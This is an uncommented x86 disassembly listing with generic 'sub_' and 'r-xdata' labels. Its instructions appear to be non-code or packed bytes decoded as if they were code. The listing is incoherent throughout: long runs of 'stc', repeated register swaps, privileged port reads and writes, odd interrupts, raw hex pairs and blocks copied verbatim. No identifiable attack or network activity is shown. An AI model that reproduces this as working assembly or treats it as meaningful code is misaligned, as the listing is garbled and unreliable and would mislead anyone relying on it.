test [ esi - 0x46131b6a ] edx
xchg esp eax
xchg esi eax
xchg esi eax
cmp [ edx ] edi
xchg esi eax
r-xdata
stc
stc
stc
stc
stc
loop r-xdata
fdivr [ ecx - 0x1369696c ]
test eax 0x96b1ec66
xchg esi eax
xchg esi eax
adc [ ebx ] 0x85
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
loopne r-xdata
inc esp
imul ebp [ ecx - 0x7 ] 0x398d2ce4
loop r-xdata
xchg ebp eax
pop edx
mov dl 0x80
imul edi [ eax ] 0x214d25e4
popad
pavgb mm4 [ ecx + edx * 4 ]
sbb [ ecx ] 0x9e696943
mov cl 0x72
test eax 0xa0b19e30
stosb [ edi ]
stc
stc
stc
stc
stc
stc
stc
xor [ ebx ] eax
push 0x4d2de00f
sub ebx [ edx - 0x57 ]
cmp [ ecx ] edi
in al 0xe5
dec ebp
cmc
imul ebp [ ecx + 0x69 ] 0x4d25e438
and [ eax ] edi
cmp [ edi ] ecx
loopne r-xdata
int 0x81
jg r-xdata
jmp r-xdata
in al dx
test eax 0x6ad9ed66
imul ebp [ ecx - 0x80 ] 0x69695e37
stc
stc
stc
stc
stc
in al 0x2c
test [ ecx ] edi
loop r-xdata
imul eax [ ecx ] 0x6969e969
add ebp [ ecx - 0x6a ]
sbb eax 0x3f96714d
sbb eax 0x6d2edf66
xchg esi eax
sub eax 0x2d50714d
dec ebp
jno r-xdata
dec ebp
xor [ esi + 0x69698dff ] edx
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
cmp esp esp
in al dx
or eax 0x39969696
adc [ ecx - 0x4b ] 0x96
xchg esi eax
stc
stc
imul ebp esp 0xdeed66a9
imul ebp [ gs : ecx - 0x1c ] 0x2ce4dd24
int 0x80
movsb [ edi ] [ esi ]
mov ch 0x96
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
scasb [ edi ]
sub al 0xb5
sbb eax 0xae1f2149
sub al 0xad
aas
and al 0x1e
or [ esi + 0xc1ba12c ] ch
aas
and al 0xae
sub al 0xa5
push ds
or [ ebx ] bl
or al 0xae
sub al 0xdd
xor [ edi + eax ] ecx
aas
scasb [ edi ]
sub al 0xd1
and al 0x24
xor [ esi + ebp * 4 ] ecx
sub al 0xd5
pop es
aas
and al 0x24
sub [ esi - 0x4c ] 0x96
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
in ax dx
mov ah 0x65
imul ebp [ ecx - 0x1c ] 0x2ce4bd24
int 0x81
or edi [ edi + 0x69 ]
imul ebp esp 0xa3ed66a9
imul ebp [ gs : ecx - 0x1c ] 0x2ce4ad24
cmp [ ecx ] bh
pavgb mm5 [ 0xffffffffff96314d ]
lea ebp [ ecx + 0x69 ]
imul ebp [ ecx + 0x38 ] 0x214d25e4
adc [ eax + 0x30696940 ] 0xec66a9ec
xchg ebx eax
pop esi
imul ebp [ ecx - 0x80 ] 0x69697e77
in al 0x2c
xchg ebp eax
cmp [ esi ] edi
xchg esi eax
sbb al 0x65
add [ eax - 0x79 ] 0x96
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
and [ edx - 0x6060607 ] ebp
loop r-xdata
xlat
loopne r-xdata
stc
stc
stc
in al dx
mov al [ 0x694af980 ]
imul edi ecx 0x9a0181f9
xchg esi eax
xchg esi eax
add esi edi
jpe r-xdata
pavgb mm2 [ ecx ]
pop edx
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
popad
or [ ebx - 0x67 ] 0x96
xchg esi eax
stc
stc
loop r-xdata
stc
stc
stc
stc
stc
stc
popfd
sbb [ edx - 0x4a ] 0x96
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
loop r-xdata
pavgb mm2 [ ebx ]
add ebp [ ss : ebx ]
pavgb mm7 [ ecx + esi * 8 ]
pavgb mm2 [ edi * 8 + 0x443a8036 ]
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
stc
stc
stc
stc
in al dx
test eax 0x9f49ed66
xchg esi eax
xchg esi eax
0x80699514 0x8f35
sbb [ gs : eax ] 0x9d
xchg esi eax
sub_486c6e
insb
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
pavgb mm5 [ ecx + ecx * 2 ]
loop r-xdata
in al dx
mov ecx 0x39969694
cmp dl [ esi - 0x231f82c2 ]
mov ecx 0xec969694
test eax 0x96b1ec66
xchg esi eax
xchg esi eax
adc [ ebx ] 0x85
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
loopne r-xdata
adc [ edi ] 0x44
imul ebp [ ecx - 0x7 ] 0x398d2ce4
loop r-xdata
inc esp
xchg ebp eax
pop edx
mov dl 0x80
imul edi [ eax ] 0x214d25e4
popad
pavgb mm4 [ ecx + edx * 4 ]
sbb [ ecx ] 0x9e696943
mov cl 0x72
test eax 0xa0b19e30
stosb [ edi ]
stc
stc
stc
stc
stc
stc
stc
xor [ ebx ] eax
push 0x4d2de00f
sub ebx [ edx - 0x57 ]
cmp [ ecx ] edi
in al 0xe5
dec ebp
cmc
imul ebp [ ecx + 0x69 ] 0x4d25e438
and [ eax ] edi
cmp [ edi ] ecx
loopne r-xdata
int 0x81
jg r-xdata
jmp r-xdata
in al dx
test eax 0x6ad9ed66
imul ebp [ ecx - 0x80 ] 0x69695e37
stc
stc
stc
stc
stc
in al 0x2c
test [ ecx ] edi
loop r-xdata
imul eax [ ecx ] 0x6969e969
add ebp [ ecx - 0x6a ]
sbb eax 0x3f96714d
sbb eax 0x6d2edf66
xchg esi eax
sub eax 0x2d50714d
dec ebp
jno r-xdata
dec ebp
xor [ esi + 0x69698dff ] edx
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
cmp esp esp
in al dx
or eax 0x39969696
adc [ ecx - 0x4b ] 0x96
xchg esi eax
stc
stc
imul ebp esp 0xdeed66a9
imul ebp [ gs : ecx - 0x1c ] 0x2ce4dd24
int 0x80
movsb [ edi ] [ esi ]
mov ch 0x96
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
scasb [ edi ]
sub al 0xb5
sbb eax 0xae1f2149
sub al 0xad
aas
and al 0x1e
or [ esi + 0xc1ba12c ] ch
aas
and al 0xae
sub al 0xa5
push ds
or [ ebx ] bl
or al 0xae
sub al 0xdd
xor [ edi + eax ] ecx
aas
scasb [ edi ]
sub al 0xd1
and al 0x24
xor [ esi + ebp * 4 ] ecx
sub al 0xd5
pop es
aas
and al 0x24
sub [ esi - 0x4c ] 0x96
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
in ax dx
mov ah 0x65
imul ebp [ ecx - 0x1c ] 0x2ce4bd24
int 0x81
or edi [ edi + 0x69 ]
imul ebp esp 0xa3ed66a9
imul ebp [ gs : ecx - 0x1c ] 0x2ce4ad24
cmp [ ecx ] bh
pavgb mm5 [ 0xffffffffff96314d ]
lea ebp [ ecx + 0x69 ]
imul ebp [ ecx + 0x38 ] 0x214d25e4
adc [ eax + 0x30696940 ] 0xec66a9ec
xchg ebx eax
pop esi
imul ebp [ ecx - 0x80 ] 0x69697e77
in al 0x2c
xchg ebp eax
cmp [ esi ] edi
xchg esi eax
sbb al 0x65
add [ eax - 0x79 ] 0x96
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
and [ edx - 0x6060607 ] ebp
loop r-xdata
xlat
loopne r-xdata
stc
stc
stc
in al dx
mov al [ 0x694af980 ]
imul edi ecx 0x9a0181f9
xchg esi eax
xchg esi eax
add esi edi
jpe r-xdata
pavgb mm2 [ ecx ]
pop edx
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
popad
or [ ebx - 0x67 ] 0x96
xchg esi eax
stc
stc
loop r-xdata
stc
stc
stc
stc
stc
stc
popfd
sbb [ edx - 0x4a ] 0x96
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
loop r-xdata
pavgb mm2 [ ebx ]
add ebp [ ss : ebx ]
pavgb mm7 [ ecx + esi * 8 ]
pavgb mm2 [ edi * 8 + 0x443a8036 ]
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
stc
stc
stc
stc
in al dx
test eax 0x9f49ed66
xchg esi eax
xchg esi eax
0x80699514 0x8f35
sbb [ gs : eax ] 0x9d
xchg esi eax
sub_486cfb
adc [ esi + 0x2ade6696 ] 0x75
paddsb mm5 [ ecx + 0x6ad9ed66 ]
imul ebp [ ecx - 0x80 ] 0x69695e37
stc
stc
stc
stc
stc
in al 0x2c
test [ ecx ] edi
loop r-xdata
imul ebp [ ecx + 0x38 ] 0x214d25e4
cmp [ ecx ] bh
pavgb mm5 [ 0xffffffffff96314d ]
lea ebp [ ecx + 0x69 ]
imul eax [ ecx ] 0x6969e969
add ebp [ ecx - 0x6a ]
sbb eax 0x3f96714d
sbb eax 0x6d2edf66
xchg esi eax
sub eax 0x2d50714d
dec ebp
jno r-xdata
adc [ eax + 0x30696940 ] 0xec66a9ec
xchg ebx eax
pop esi
imul ebp [ ecx - 0x80 ] 0x69697e77
in al 0x2c
xchg ebp eax
cmp [ esi ] edi
xchg esi eax
sbb al 0x65
add [ eax - 0x79 ] 0x96
xchg esi eax
stc
stc
stc
int 0x81
jg r-xdata
jmp r-xdata
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
cmp esp esp
in al dx
or eax 0x39969696
adc [ ecx - 0x4b ] 0x96
xchg esi eax
stc
stc
imul ebp esp 0xdeed66a9
imul ebp [ gs : ecx - 0x1c ] 0x2ce4dd24
int 0x80
movsb [ edi ] [ esi ]
mov ch 0x96
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
scasb [ edi ]
sub al 0xb5
sbb eax 0xae1f2149
sub al 0xad
aas
and al 0x1e
or [ esi + 0xc1ba12c ] ch
aas
and al 0xae
sub al 0xa5
push ds
or [ ebx ] bl
or al 0xae
sub al 0xdd
xor [ edi + eax ] ecx
aas
scasb [ edi ]
sub al 0xd1
and al 0x24
xor [ esi + ebp * 4 ] ecx
sub al 0xd5
pop es
aas
and al 0x24
sub [ esi - 0x4c ] 0x96
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
in ax dx
mov ah 0x65
imul ebp [ ecx - 0x1c ] 0x2ce4bd24
int 0x81
or edi [ edi + 0x69 ]
imul ebp esp 0xa3ed66a9
imul ebp [ gs : ecx - 0x1c ] 0x2ce4ad24
stc
stc
stc
stc
and [ edx - 0x6060607 ] ebp
loop r-xdata
xlat
loopne r-xdata
stc
stc
stc
in al dx
mov al [ 0x694af980 ]
imul edi ecx 0x9a0181f9
xchg esi eax
xchg esi eax
add esi edi
jpe r-xdata
pavgb mm2 [ ecx ]
pop edx
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
popad
or [ ebx - 0x67 ] 0x96
xchg esi eax
stc
stc
loop r-xdata
stc
stc
stc
stc
stc
stc
popfd
sbb [ edx - 0x4a ] 0x96
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
loop r-xdata
pavgb mm2 [ ebx ]
add ebp [ ss : ebx ]
pavgb mm7 [ ecx + esi * 8 ]
pavgb mm2 [ edi * 8 + 0x443a8036 ]
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
stc
stc
stc
stc
in al dx
test eax 0x9f49ed66
xchg esi eax
xchg esi eax
0x80699514 0x8f35
sbb [ gs : eax ] 0x9d
xchg esi eax
sub_486e9e
xchg esi eax
xchg esi eax
xor ch ah
test eax 0x9be6ed66
xchg esi eax
xchg esi eax
in al 0x24
mov ebp 0x80ad2ce4
or [ eax + 0x69 ] ch
imul edi ecx 0xaaa032f9
stc
stc
stc
stc
stc
stc
stc
stc
0xffff8501 0x9696
sub_487090
xlat
and ah ch
add al 0x89
xchg esi eax
xchg esi eax
stc
stc
in al 0x2e
push 0x6edf6639
cmp eax ebp
scasb [ edi ]
mov [ 0xffffffffe4696969 ] eax
in eax dx
dec ebp
int1
imul ebp [ ecx + 0x69 ] 0xafe2393e
sub [ eax + edx * 4 - 0x6a ] 0x79adea96
0x687d4d15 0xec66
sub_487239
aad 0x96
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
xchg esi eax
xchg esi eax
aaa
or esi [ ebx ]
pavgb mm7 [ ecx + 0xf330e03 ]
loopne r-xdata
stosb [ edi ]
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
push eax
adc eax 0xec66754d
insb
imul ebp [ ecx + 0x69 ] 0x794d2daf
imul edx [ eax + 0x15 ] 0xec665d4d
insb
imul ebp [ ecx + 0x69 ] 0x794d2daf
imul eax [ eax + 0x69696f48 ] 0xfffffff9
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
add [ ecx + 0x59 ] ebp
imul ebp [ ecx + 0x1 ] 0x69697969
cmp al [ eax + 0x69697aad ]
stc
stc
stc
stc
stc
pop edx
mov dl 0x81
hlt
in al dx
mov cl [ ebp + 0x37369696 ]
pop es
pavgb mm7 [ edi + ecx ]
loop r-xdata
stc
stc
cmp [ edi - 0x1b696964 ] 0x80398d2c
outsd
pushfd
xchg esi eax
xchg esi eax
stc
pavgb mm7 [ ecx + ecx ]
xor eax [ ebx ]
or ecx [ edi ]
loopne r-xdata
imul ebp [ ecx - 0x6a ] 0xaee2851c
add [ ebp + 0x77 ] 0x5a306969
test eax 0x69496780
imul edi ecx 0xf9f9f9f9
pop edx
test eax 0x192ce00f
in al 0x2c
jge r-xdata
stc
in al 0x21
imul eax [ edx ] 0xffffffa9
insb
add ah [ eax - 0x69d27f94 ]
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
and bh 0x81
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
in ax dx
bound ebp [ ecx + 0x69 ]
imul edx [ esi - 0x511d7ae4 ] 0x69774581
imul esi [ eax ] 0x6780a95a
dec ecx
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
lodsb [ esi ]
inc edi
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
stc
stc
stc
stc
stc
stc
stc
stc
xchg esi eax
sbb al 0x7d
xor [ ecx ] 0xb2
xchg esi eax
xchg esi eax
stc
stc
sub_488d1b
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
in ax dx
out 0x67 al
imul ebp [ ecx - 0x16 ] 0xea0f6baf
push edi
imul eax [ eax + 0x69696714 ] 0xaaa0f9f9
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
and [ eax - 0x6969692 ] 0xf9
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
in al 0xec
mov ebp 0x39969694
cmp [ ebx + 0x6e ] 0xadea6969
jns r-xdata
stc
stc
stc
stc
stc
stc
stc
stc
paddsb mm3 [ edi - 0x4b2c139a ]
xchg esi eax
xchg esi eax
pop edx
test eax 0xf9aa3237
stc
stc
stc
stc
pminsw mm2 [ eax + 0x69 ]
loop r-xdata
stosb [ edi ]
stc
stc
loopne r-xdata
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
xchg esi eax
sbb al 0x89
loopne r-xdata
xchg ecx eax
and dl 0x7e
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
loopne r-xdata
mov ebp 0xec3d3e96
test eax 0xd615ed66
xchg esi eax
xchg esi eax
add esi 0xe09696ac
sub al 0xa5
push edx
das
pop ebp
in al dx
outsb
imul ebp [ ecx + 0x69 ] 0xb51c9639
xchg esi eax
xor eax 0xe4391f96
sub al 0x85
cmp [ esi ] edi
xchg esi eax
cmp al [ eax + 0x696979d0 ]
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
pavgb mm7 [ esi * 4 + 0xf490333 ]
loopne r-xdata
test [ eax - 0x69696f7b ] eax
jbe r-xdata
mov bh 0x33
add ebx [ edx ]
pavgb mm7 [ ecx + ecx * 4 ]
loop r-xdata
jle r-xdata
pop edx
mov dl 0x52
xchg edx eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
loopne r-xdata
imul ebp [ ecx - 0x7 ] 0x2ce00ff9
mov cl 0x31
add eax [ edx ]
mov [ 0xffffffffbe90ed66 ] al
xchg esi eax
push edx
pavgb mm7 [ ebx + ecx * 4 ]
loop r-xdata
loop r-xdata
xchg esi eax
xchg esi eax
stc
stc
stc
stc
sub [ eax - 0x69694c0a ] eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
imul edi ecx 0xf9f9f9f9
mov ecx 0x96aafd80
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
aaa
stosb [ edi ]
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
inc edx
sub eax 0x55806d4d
mov dh 0x96
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
stc
stc
stc
stc
stc
stc
in al 0xec
jmp 0x3adf24fe
xchg esi eax
stc
stc
stc
stc
in al dx
outsb
imul ebp [ ecx + 0x69 ] 0xc5ff963a
imul ebp [ ecx + 0x69 ] 0x96a12e80
xchg esi eax
xchg esi eax
test [ esi + 0x60978096 ] edx
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
stc
stc
cmp dl [ esi + 0x2ce0293f ]
popfd
push edx
scasb [ edi ]
adc [ esi - 0x6969695 ] 0xf9
stc
pop edx
test eax 0x9ce58029
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
in al dx
xchg esi eax
in ax dx
xor edi [ eax + 0x69 ]
imul eax [ eax - 0x6969663b ] 0x53f101f9
imul ebp [ ecx - 0x6a ] 0xb180613f
stosd [ edi ]
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
fidivr [ eax - 0x16 ]
test al 0x6b
pop edx
test eax 0xeab933e4
xchg edx eax
pushad
adc ch 0x68
imul ebp [ ecx - 0x7 ] 0xe0f9f9f9
xor al 0x91
rsqrtps xmm5 [ edi ]
outsd
0x6b9a 0x6969
xchg esi eax
sub esi 0x80969695
jpo r-xdata
pavgb mm7 [ ecx * 4 + 0xf490333 ]
loopne r-xdata
xor [ eax ] 0x24e00f3b
add [ eax - 0x6969556b ] 0xfffffff9
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
xchg esi eax
sbb al 0x8d
xchg esi eax
r-xdata
in ax dx
push 0x529696b1
sub_489964
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
0x666a9514 0x34eb
sub_489b9e
xor [ edi ] ecx
loopne r-xdata
in al dx
sbb [ eax + 0x3f809696 ] bl
nop
xchg esi eax
xchg esi eax
stc
add edx [ ecx ]
xor eax [ ebx ]
add [ cs : esi ] 0x99
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
pavgb mm5 [ ebx + ebx * 4 ]
xor [ ebx ] eax
add [ edi ] cl
loopne r-xdata
sbb [ edx - 0x57 ] 0x832ce00f
in al 0xec
aad 0x93
xchg esi eax
xchg esi eax
cmp [ eax - 0x69696e82 ] eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
in al dx
or cl [ esi - 0x7ec5079e ]
and [ esi + edx * 4 - 0x633dfe6a ] ebp
popfd
xor [ edi ] ecx
loopne r-xdata
and [ ecx ] 0x19696ac
retn 0x149c
adc al 0x55
cmp ah al
out dx eax
xchg ebp eax
imul ebp [ ecx + 0x69 ] 0x96ac5e81
xchg esi eax
add [ ebx + ebx * 2 - 0x1fc57891 ] eax
out dx eax
xchg ecx eax
imul ebp [ ecx + 0x69 ] 0x96ac4f81
xchg esi eax
0xefe071ad 0x699d
lahf
and [ eax - 0x5e ] 0x96
xchg esi eax
xor [ ebx ] al
push ds
pavgb mm4 [ ebx + edi * 4 ]
xor [ eax - 0x696962c5 ] al
stc
pop edx
test eax 0xf9aaa036
stc
stc
stc
stc
stc
stc
in ax dx
pop edi
imul ebp [ ecx + 0x69 ] 0x628e0a01
clc
cmp al [ ecx - 0x696953df ]
add edx eax
pushfd
sub_489d0f
mov [ 0x39696a6 ] al
push es
xor [ ebx ] eax
sbb [ edi ] ecx
loopne r-xdata
cwde
mov ah 0x96
xchg esi eax
stc
stc
dec ebp
push ebp
xor [ ebx ] eax
or al 0xf
loopne r-xdata
adc [ ebx - 0x1dc0696a ] ecx
cdq
inc edx
cwde
0x90806ba8 0x96a8
dec ebp
push edi
xor [ ebx ] eax
pop es
pavgb mm5 [ 0xffffffffee80294d ]
cmpsb [ esi ] [ edi ]
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
xchg esi eax
sbb al 0x8d
xchg esi eax
dec ecx
loopne r-xdata
ficom [ esi + 0x43910196 ]
imul ebp [ ecx - 0x80 ] 0x9696de47
stc
stc
stc
stc
add [ ecx + 0x1 ] esp
loopne r-xdata
in ax dx
xchg ebp eax
push eax
xor al 0x95
sbb [ eax - 0x669694c ] 0xf9
loope r-xdata
xchg esi eax
fisubr [ ebp - 0x7e969697 ]
sub al 0x83
xchg esi eax
xchg esi eax
0xa9ec71ad 0xed66
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
fidivr [ eax - 0x80 ]
popfd
movsd [ edi ] [ esi ]
xchg esi eax
xchg esi eax
in al 0xec
adc eax 0x39969694
in al 0x2c
mov [ ecx ] edi
in al 0xec
sbb eax 0x39969692
xchg esi eax
inc [ ecx - 0x7f969697 ]
outsb
outsb
imul ebp [ ecx - 0x7 ] 0xa036a95a
stosb [ edi ]
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
and [ ebp + 0x69 ] 0x69
imul edi ecx 0xf9f9f9f9
stc
stc
stc
stc
0xea0f6ba8 0x4950
mov [ eax - 0x69693c90 ] eax
stc
cmp [ esi - 0x21 ] esp
outsb
cmp eax ebp
scasb [ edi ]
mov [ 0xffffffffe4696969 ] eax
in eax dx
dec ebp
leave
imul ebp [ ecx + 0x69 ] 0x3e
cmp edx esp
scasd [ edi ]
and [ ebx - 0x1569695e ] 0xa28079ad
mov ebx 0xf9f99696
sub_489d60
xchg esi eax
stc
stc
stc
stc
stc
stc
push esp
or [ ebx - 0x11999697 ] eax
push edx
ficom [ esi + 0x43910196 ]
imul ebp [ ecx - 0x80 ] 0x9696de47
stc
stc
stc
stc
add [ ecx + 0x1 ] esp
loopne r-xdata
loope r-xdata
xchg esi eax
fisubr [ ebp - 0x7e969697 ]
sub al 0x83
xchg esi eax
xchg esi eax
0xa9ec71ad 0xed66
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
fidivr [ eax - 0x80 ]
popfd
movsd [ edi ] [ esi ]
xchg esi eax
xchg esi eax
in al 0xec
adc eax 0x39969694
in al 0x2c
mov [ ecx ] edi
in al 0xec
sbb eax 0x39969692
xchg esi eax
inc [ ecx - 0x7f969697 ]
outsb
outsb
imul ebp [ ecx - 0x7 ] 0xa036a95a
stosb [ edi ]
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
and [ ebp + 0x69 ] 0x69
imul edi ecx 0xf9f9f9f9
stc
stc
stc
stc
0xea0f6ba8 0x4950
mov [ eax - 0x69693c90 ] eax
stc
cmp [ esi - 0x21 ] esp
outsb
cmp eax ebp
scasb [ edi ]
mov [ 0xffffffffe4696969 ] eax
in eax dx
dec ebp
leave
imul ebp [ ecx + 0x69 ] 0x3e
cmp edx esp
scasd [ edi ]
and [ ebx - 0x1569695e ] 0xa28079ad
mov ebx 0xf9f99696
sub_489e75
sub dh 0xa5
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
aas
adc edx 0xea9696d9
lodsd [ esi ]
adc [ gs : eax - 0x669694f ] 0xf9
stc
sub esp ecx
xor eax 0x97eace7c
dec ecx
jmp r-xdata
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
0x9c806bab 0x96b9
sub_489f14
xchg esi eax
stc
stc
sub [ eax - 0x69c60656 ] esp
sbb al 0x8d
loopne r-xdata
stc
stc
stc
in ax dx
sub ebx [ edi - 0x7e15696a ]
imul esp [ esi - 0x22 ] 0x61
cmp [ 0xfffffffff9696969 ] 0x52
stosb [ edi ]
in ax dx
mov esp 0x5a9696af
lahf
push edx
stosb [ edi ]
out dx ax
in al dx
lea edx [ esi - 0x4eac7f6a ]
xchg esi eax
xchg esi eax
loop r-xdata
mov ch 0x80
jpe r-xdata
xchg esi eax
stc
stc
stc
xchg ebp eax
fisubr [ ebp + 0x2a ]
loop r-xdata
xchg esi eax
xchg esi eax
xchg esi eax
sub al 0x95
sub [ eax - 0x669696d ] 0xf9
stc
add ebx [ ss : ebx ]
loop r-xdata
xchg esi eax
xchg esi eax
stc
cmp [ eax - 0x696956f9 ] eax
stc
stc
cmp al 0xe2
test edx ebp
test [ ebp - 0x1e ] edi
out dx eax
cdq
imul ebp [ ecx + 0x69 ] 0x2ce03e3a
test [ edx - 0x4e ] bl
xchg esi eax
xchg esi eax
cmp [ edx - 0x6696964 ] 0xf9
stc
stc
stc
stc
stc
stc
stc
sub eax 0x2d037159
adc [ 0x3e969696 ] 0x3d
in al dx
test eax 0xb278ed66
xchg esi eax
xchg esi eax
cmp al [ eax - 0x696960c2 ]
stc
stc
stc
stc
stc
stc
loop r-xdata
lahf
xchg esi eax
xchg esi eax
out dx al
or ah 0x98
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
0xea0f6ba8 0x4950
pavgb mm5 [ edi * 2 + 0x33060331 ]
add ecx [ edx ]
adc ah 0x85
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
0x9c806bab 0x96b9
stc
stc
stc
stc
stc
pop edx
lahf
loop r-xdata
in al 0xe4
mov eax [ 0xffffffff81969694 ]
inc esp
mov [ 0xffffffff92809696 ] eax
mov bh 0x96
xchg esi eax
stc
stc
stc
stc
pop edx
test eax 0xaaa03629
stc
stc
stc
stc
stc
stc
stc
stc
stc
cmp dl ah
sub al 0x61
adc [ ecx - 0x669697d ] 0xf9
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
